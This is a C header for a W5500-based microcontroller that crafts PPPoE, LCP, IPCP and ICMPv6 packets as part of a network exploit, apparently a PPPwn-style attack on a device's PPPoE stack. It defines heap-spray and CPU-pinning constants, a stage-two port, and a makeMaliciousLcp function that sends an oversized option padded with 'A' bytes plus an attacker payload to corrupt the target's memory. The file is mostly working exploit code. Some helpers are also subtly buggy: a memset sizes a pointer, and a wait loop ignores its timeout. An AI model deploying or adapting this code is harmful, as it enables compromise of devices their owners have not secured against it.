#ifndef PACKET_H
#define PACKET_H

#include <string.h>
#include "defines.h"
#include "wiznet/w5500.h"
#include "wiznet/socket.h"
#include "wiznet/wizchip_conf.h"

#define SPRAY_NUM 0x1000
#define PIN_NUM 0x1000
#define CORRUPT_NUM 0x1

#define HOLE_START 0x400
#define HOLE_SPACE 0x10

#define LCP_ID 0x41
#define IPCP_ID 0x41

#define SESSION_ID 0xffff

#define STAGE2_PORT 9020

#define PPP_IPCP_Option_IP 0x03
#define NET_MAX_BUF 2048

typedef uint8_t (*WaitFunc)(uint8_t*);

const static uint8_t SOURCE_MAC[6] = {0x41, 0x41, 0x41, 0x41, 0x41, 0x41};
const static uint8_t SOURCE_IPV4[4] = {41, 41, 41, 41};
const static uint8_t TARGET_IPV4[4] = {42, 42, 42, 42};

static void calcIPV4Checksum(uint8_t* packet) {
    uint8_t *_packet = packet + 14; // Skip Ethernet header
    unsigned long sum = 0;
    uint8_t hdr_len = (_packet[0] & 0x0F) * 4; // Get header length from the first byte

    // Sum 16-bit words
    for (size_t i = 0; i < hdr_len; i += 2) {
        if (i + 1 < hdr_len) {
            sum += (_packet[i] << 8) + _packet[i + 1]; // Combine two bytes into one word
        } else {
            sum += _packet[i] << 8; // Handle odd byte
        }
    }

    // Fold 32-bit sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    uint16_t res = (uint16_t)(~sum);
    packet[24] = (res >> 8) & 0xFF; // Set the checksum in the packet
    packet[25] = res & 0xFF;
}

static void calcIcmpv6Checksum(uint8_t* packet) {
    uint16_t word;
    uint32_t sum = 0;

    // Source IPV6
    for (int i = 22; i < 22 + 16; i += 2) {
        word = ((uint16_t)packet[i] << 8) | packet[i + 1];
        sum += word;
    }
    // Target IPV6
    for (int i = 38; i < 38 + 16; i += 2) {
        word = ((uint16_t)packet[i] << 8) | packet[i + 1];
        sum += word;
    }
    // Payload Size
    uint16_t icmpv6_len = ((uint16_t)packet[18] << 8) | packet[19];
    sum += icmpv6_len + packet[20];
    // ICMPV6 Payload
    uint8_t icmpv6_start = 54;
    for (int i = icmpv6_start; i < icmpv6_start + icmpv6_len; i += 2) {
        uint16_t word = ((uint16_t) packet[i] << 8) | packet[i+1];
        sum += word;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    uint16_t checksum = ~((uint16_t) sum);
    packet[56] = (checksum >> 8) & 0xFF;
    packet[57] = checksum & 0xFF;
}

static uint16_t makePADO(uint8_t* packet, const uint8_t *source_mac, const uint8_t *target_mac, const uint8_t *ac_cookie, uint16_t ac_cookie_len, const uint64_t *host_uniq, uint8_t host_uniq_len) {
    uint16_t packet_size = 0;

    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    // // set type
    packet[12] = 0x88; packet[13] = 0x63;
    packet[14] = 0x11; packet[15] = 0x07;
    
    if (ac_cookie_len == 0) {
        packet[18] = 0x00; packet[19] = 0x10;
        packet[20] = 0x01; packet[21] = 0x04;
        packet[22] = 0x00; packet[23] = 0x00;

        packet[24] = 0x01; packet[25] = 0x03;
        packet[26] = 0x00; packet[27] = 0x08;
        memcpy(packet+28, host_uniq, host_uniq_len);

        packet_size = 36;
    }
    else {
        // set payload size
        packet_size = (ac_cookie_len + 4) + (8 + 4);
        packet[18] = (packet_size >> 8) & 0xFF; packet[19] = packet_size & 0xFF;

        packet[20] = 0x01; packet[21] = 0x04;
        // set ac_cookie_len
        packet[22] = (ac_cookie_len >> 8) & 0xFF; packet[23] = ac_cookie_len & 0xFF;
        memcpy(packet+24, ac_cookie, ac_cookie_len);

        packet[ac_cookie_len+24] = 0x01; packet[ac_cookie_len+25] = 0x03;
        packet[ac_cookie_len+26] = 0x00; packet[ac_cookie_len+27] = 0x08;
        memcpy(packet+ac_cookie_len+28, host_uniq, host_uniq_len);

        packet_size = ac_cookie_len + host_uniq_len + 28;
    }

    return packet_size;
}

static uint16_t makePADS(uint8_t* packet, const char *source_mac, const char *target_mac, const uint64_t *host_uniq, uint8_t host_uniq_len) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    // // set type
    packet[12] = 0x88; packet[13] = 0x63;

    // set pads parameters
    packet[14] = 0x11; packet[15] = 0x65;
    packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x00; packet[19] = 0x0c;

    packet[20] = 0x01; packet[21] = 0x03;
    packet[22] = 0x00; packet[23] = 0x08;
    memcpy(packet+24, host_uniq, host_uniq_len);

    return 32;
}

static uint16_t makePADT(uint8_t* packet, const char *source_mac, const char *target_mac) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);
    packet[12] = 0x88; packet[13] = 0x63;

    packet[14] = 0x11; packet[15] = 0xa7; packet[16] = 0xff;
    packet[17] = 0xff; packet[18] = 0; packet[19] = 0;

    return 20;
}

static uint16_t makeLcpReq(uint8_t* packet, const char *source_mac, const char *target_mac) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    packet[12] = 0x88; packet[13] = 0x64;
    packet[14] = 0x11; packet[15] = 0x00;
    packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x00; packet[19] = 0x06;

    packet[20] = 0xc0; packet[21] = 0x21;
    packet[22] = 0x01; packet[23] = 0x41;
    packet[24] = 0x00; packet[25] = 0x04;

    return 26;
}

static uint16_t makeLcpACK(uint8_t* packet, const char *source_mac, const char *target_mac, const uint8_t lcp_id) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    packet[12] = 0x88; packet[13] = 0x64;
    packet[14] = 0x11; packet[15] = 0x00;
    packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x00; packet[19] = 0x06;

    packet[20] = 0xc0; packet[21] = 0x21;
    packet[22] = 0x02; packet[23] = lcp_id;
    packet[24] = 0x00; packet[25] = 0x04;

    return 26;
}

static uint16_t makeLcpTerm(uint8_t* packet, const char *source_mac, const char *target_mac) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    packet[12] = 0x88; packet[13] = 0x64;
    packet[14] = 0x11; packet[15] = 0x00;
    packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x00; packet[19] = 0x06;

    packet[20] = 0xc0; packet[21] = 0x21;
    packet[22] = 0x05; packet[23] = 0x00;
    packet[24] = 0x00; packet[25] = 0x04;

    return 26;
}

static uint16_t makeIpcpConfig(uint8_t* packet, const char *source_mac, const char *target_mac) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    packet[12] = 0x88; packet[13] = 0x64;
    packet[14] = 0x11; packet[15] = 0x00;
    packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x00; packet[19] = 0x0c;
    packet[20] = 0x80; packet[21] = 0x21;

    packet[22] = 0x01; packet[23] = 0x41;
    packet[24] = 0x00; packet[25] = 0x0a;
    packet[26] = 0x03; packet[27] = 0x06;

    packet[28] = 0x29; packet[29] = 0x29;
    packet[30] = 0x29; packet[31] = 0x29;

    return 32;
}

static uint16_t makeIpcpNAK(uint8_t* packet, const char *source_mac, const char *target_mac, const uint8_t lcp_id) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    packet[12] = 0x88; packet[13] = 0x64;
    packet[14] = 0x11; packet[15] = 0x00;
    packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x00; packet[19] = 0x0c;
    packet[20] = 0x80; packet[21] = 0x21;

    packet[22] = 0x03; packet[23] = lcp_id;
    packet[24] = 0x00; packet[25] = 0x0a;
    packet[26] = 0x03; packet[27] = 0x06;

    packet[28] = 0x2a; packet[29] = 0x2a;
    packet[30] = 0x2a; packet[31] = 0x2a;

    return 32;
}

static uint16_t makeIpcpACK(uint8_t* packet, const char *source_mac, const char *target_mac, const uint8_t lcp_id) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);

    packet[12] = 0x88; packet[13] = 0x64;
    packet[14] = 0x11; packet[15] = 0x00;
    packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x00; packet[19] = 0x0c;
    packet[20] = 0x80; packet[21] = 0x21;

    packet[22] = 0x02; packet[23] = lcp_id;
    packet[24] = 0x00; packet[25] = 0x0a;
    packet[26] = 0x03; packet[27] = 0x06;

    packet[28] = 0x2a; packet[29] = 0x2a;
    packet[30] = 0x2a; packet[31] = 0x2a;

    return 32;
}

static uint16_t makeIcmpv6Echo(uint8_t* packet, const char *source_mac, const char *target_mac, const char *source_ipv6, const char *target_ipv6) {
    // ETH Header
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);
    packet[12] = 0x86; packet[13] = 0xdd;

    // IPV6 Header
    packet[14] = 0x60; packet[15] = 0x00; packet[16] = 0x00;
    packet[17] = 0x00; packet[18] = 0x00; packet[19] = 0x08;
    packet[20] = 0x3a; packet[21] = 0x40;
    memcpy(packet+22, source_ipv6, 16);
    memcpy(packet+38, target_ipv6, 16);

    // ICMPV6 Header
    packet[54] = 0x80; packet[55] = 0;
    packet[56] = 0; packet[57] = 0; // Checksum
    packet[58] = 0; packet[59] = 0; packet[60] = 0; packet[61] = 0;
    calcIcmpv6Checksum(packet);

    return 62;
}

static uint16_t makeIcmpv6Na(uint8_t* packet, const char *source_mac, const char *target_mac, const char *source_ipv6, const char *target_ipv6) {
    // ETH Header
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);
    packet[12] = 0x86; packet[13] = 0xdd;

    // IPV6 Header
    packet[14] = 0x60; packet[15] = 0x00; packet[16] = 0x00;
    packet[17] = 0x00; packet[18] = 0x00; packet[19] = 0x20;
    packet[20] = 0x3a; packet[21] = 0xff;
    memcpy(packet+22, source_ipv6, 16);
    memcpy(packet+38, target_ipv6, 16);

    // ICMPV6 Header
    packet[54] = 0x88; packet[55] = 0;
    packet[56] = 0; packet[57] = 0; // Checksum
    packet[58] = 0xe0; packet[59] = 0; packet[60] = 0; packet[61] = 0;
    memcpy(packet+62, source_ipv6, 16);
    packet[78] = 0x02; packet[79] = 0x01;
    memcpy(packet+80, target_mac, 6);
    calcIcmpv6Checksum(packet);

    return 86;
}

static uint16_t makePinCpu0Packet(uint8_t* packet, const char *source_mac, const char *target_mac) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);
    packet[12] = 0x88; packet[13] = 0x64;

    return 14;
}

static uint16_t makeLcpEchoReply(uint8_t* packet, const char *source_mac, const char *target_mac) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);
    
    packet[22] = 0x0a;

    return 60;
}

static uint16_t makeMaliciousLcp(uint8_t* packet, const char *source_mac, const char *target_mac, const uint8_t *malicious_lcp, uint16_t malicious_lcp_size) {
    memcpy(packet, source_mac, 6);
    memcpy(packet+6, target_mac, 6);
    packet[12] = 0x88; packet[13] = 0x64;

    packet[14] = 0x11; packet[15] = 0x00; packet[16] = 0xff; packet[17] = 0xff;
    packet[18] = 0x01; packet[19] = 0x7e; packet[20] = 0xc0; packet[21] = 0x21;
    packet[22] = 0x01; packet[23] = 0x41; packet[24] = 0x01; packet[25] = 0x04;

    packet[26] = 0x00; packet[27] = 0xfe;
    memset(packet+28, 'A', 252);

    packet[280] = 0x00; packet[281] = 0x7a;
    memcpy(packet+282, malicious_lcp, malicious_lcp_size);

    return 402;
}

static uint8_t isLcpReject(uint8_t* packet) {
    // if (packet[12] == 0x88 && packet[13] == 0x64 && packet[22] == 0x04) {
    if (packet[12] == 0x88 && packet[13] == 0x64) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isLcpEchoRequest(uint8_t* packet) {
    if (packet[12] == 0x88 && packet[13] == 0x64 && packet[22] == 0x09) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isICMPv6EchoReply(uint8_t* packet) {
    if (packet[12] == 0x86 && packet[13] == 0xdd && packet[20] == 0x3a && packet[54] == 0x81) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isICMPv6Ns(uint8_t* packet) {
    if (packet[12] == 0x86 && packet[13] == 0xdd && packet[20] == 0x3a && packet[54] == 0x87) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isICMPv6(uint8_t* packet) {
    if (packet[12] == 0x86 && packet[13] == 0xdd && packet[20] == 0x3a) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isIpcpConfigReq(uint8_t* packet) {
    if (packet[12] == 0x88 && packet[13] == 0x64 && packet[22] == 0x01
        && packet[20] == 0x80 && packet[21] == 0x21) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isIpcpACK(uint8_t* packet) {
    if (packet[12] == 0x88 && packet[13] == 0x64 && packet[22] == 0x02
        && packet[20] == 0x80 && packet[21] == 0x21) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isLcpConfig(uint8_t* packet) {
    if (packet[12] == 0x88 && packet[13] == 0x64 && packet[22] == 0x01
        && packet[20] == 0xc0 && packet[21] == 0x21) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isLcpACK(uint8_t* packet) {
    if (packet[12] == 0x88 && packet[13] == 0x64 && packet[22] == 0x02) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isPADI(uint8_t* packet) {
    if (packet[12] == 0x88 && packet[13] == 0x63 && packet[15] == 0x09) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t isPADR(uint8_t* packet) {
    if (packet[12] == 0x88 && packet[13] == 0x63 && packet[15] == 0x19) {
        return RETURN_SUCCESS;
    }
    return RETURN_FAIL;
}

static uint8_t readPacket(uint8_t* packet) {
    uint8_t ret;
    uint16_t size;

    memset(packet, 0, sizeof(packet));

    if((size = getSn_RX_RSR(SN)) > 0) {
        if(size > NET_MAX_BUF) size = NET_MAX_BUF;
        ret = recvfrom(SN, packet, size, 0, 0);
        if (ret > 0)
            return RETURN_SUCCESS;
    }

    return RETURN_FAIL;
}

static uint8_t waitPacket(WaitFunc cb, uint8_t* packet, uint8_t timeout) {
    while (1) {
        if (readPacket(packet) == RETURN_FAIL)
            continue;
        if (cb(packet) == RETURN_SUCCESS)
            break;
    }

    return RETURN_SUCCESS;
}

#endif